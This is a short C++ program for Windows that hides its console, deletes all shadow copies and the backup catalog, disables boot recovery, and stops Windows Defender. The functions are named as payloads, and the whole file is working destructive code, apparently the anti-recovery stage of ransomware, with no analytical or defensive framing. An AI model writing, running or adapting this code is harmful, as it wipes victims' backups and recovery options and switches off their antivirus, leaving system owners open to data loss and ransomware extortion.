#include <Windows.h>
#include <iostream>

void HideCons() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}
void Payload1() 
{
	system("vssadmin delete shadow /all /quiet");
	system("wmic shadowcopy delete");
	system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
	system("bcdedit /set {default} recoveryenabled no");
	system("wbadmin delete catalog -quiet");
}
void Payload2() 
{
	system("sc stop WinDefend");
}
int main() 
{
	HideCons();
	Payload1();
	Payload2();
	return 0;
}